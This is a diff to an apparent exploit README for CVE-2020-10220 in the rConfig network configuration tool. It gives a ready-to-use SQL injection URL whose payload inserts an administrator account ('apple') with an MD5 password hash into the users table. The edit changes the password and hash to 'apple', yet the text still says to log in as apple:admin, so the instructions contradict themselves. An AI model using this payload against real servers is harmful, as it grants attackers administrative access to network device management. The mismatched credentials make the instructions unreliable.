@@ -2,9 +2,9 @@
 
 ## CVE-2020-10220 
 
-The following URL adds a user "apple" with password "admin" to the rConfig service. After running this, you can then login with the credentials apple:admin
+The following URL adds a user "apple" with password "apple" to the rConfig service. After running this, you can then login with the credentials apple:admin
 ```
-https://192.168.95.57:8081/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command ;INSERT INTO `users` (`id`, `username`, `password`, `userid`, `userlevel`, `email`, `timestamp`, `status`) VALUES ('450', 'apple', '21232f297a57a5a743894a0e4a801fc3', '6c97424dc92f14ae78f8cc13cd08308d', 9, 'apple@domain.com', 1346920339, 1);--
+https://192.168.95.57:8081/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command ;INSERT INTO `users` (`id`, `username`, `password`, `userid`, `userlevel`, `email`, `timestamp`, `status`) VALUES ('450', 'apple', '1f3870be274f6c49b3e31a0c6728957f', '6c97424dc92f14ae78f8cc13cd08308d', 9, 'apple@domain.com', 1346920339, 1);--
 ```
 #### Things that can be changed:
 * Obviously the username can be change. 
